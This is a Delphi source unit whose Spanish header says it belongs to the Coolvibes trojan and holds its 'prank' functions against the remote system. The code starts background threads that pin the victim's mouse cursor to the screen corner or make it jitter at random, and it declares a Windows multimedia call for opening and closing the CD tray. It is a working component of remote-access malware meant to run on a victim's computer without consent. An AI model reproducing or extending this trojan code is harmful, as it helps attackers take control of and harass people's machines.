{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
para relaizar distintos tipos de bromas en el sistema remoto}
unit UnitBromas;

interface

uses
  Windows;

type
  MCIERROR = DWORD; { error return code, 0 means no error }

procedure CongelarMouse(Bool: Boolean);
procedure TemblarMouse(Bool: Boolean);
function mciSendString(lpstrCommand, lpstrReturnString: PChar; //Para abrir/cerrar cd
  uReturnLength: UINT; hWndCallback: HWND): MCIERROR; stdcall;
function mciSendString; external 'winmm.dll' Name 'mciSendStringA';
implementation

var
  MouseIsCongelado: Boolean = False;
  MouseIsTemblando: Boolean = False;

procedure CongelarMouse(Bool: Boolean);
//Esta función está dentro de CongelarMouse ya que solo se usa aquí

procedure FijarCursor;
  begin
    while MouseIsCongelado do
      begin
        SetCursorPos(1, 1);
        //Fija el cursor en la esquina superor izquierda
        Sleep(1);
      end;
  end;

var
  id: Cardinal;
begin
  if Bool = False then
    begin
      MouseIsCongelado := False;
    end
  else
    begin
      MouseIsCongelado := True;
      BeginThread(nil, 0, @FijarCursor, nil, 0, id);
      //Empieza en un nuevo Thread la Funcion FijarCursor
    end;
end;

procedure TemblarMouse(Bool: Boolean);

  procedure MouseTemblando;
  var
    Direccion: Byte;
    Coord: TPoint;
  begin
    while MouseIsTemblando do
      begin
        Direccion := Random(4); //devuelve un aleatorio entre 0 y 3
        case direccion of
          0:
            begin
              GetCursorPos(Coord);
              SetCursorPos(Coord.x + 4, coord.y + 4);
            end;
          1:
            begin
              GetCursorPos(Coord);
              SetCursorPos(Coord.x + 4, coord.y - 4);
            end;
          2:
            begin
              GetCursorPos(Coord);
              SetCursorPos(Coord.x - 4, coord.y - 4);
            end;
          3:
            begin
              GetCursorPos(Coord);
              SetCursorPos(Coord.x - 4, coord.y + 4);
            end;
        end;
        Sleep(30);
      end;
  end;

var
  id: Cardinal;
begin
  if Bool = False then
    begin
      MouseIsTemblando := False;
    end
  else
    begin
      MouseIsTemblando := True;
      BeginThread(nil, 0, @MouseTemblando, nil, 0, id);
      //Empieza en un nuevo Thread la Funcion MouseTemblando
    end;
end;

begin
  Randomize; //Para que la función random tome valores distintos en cada ejecución
end.
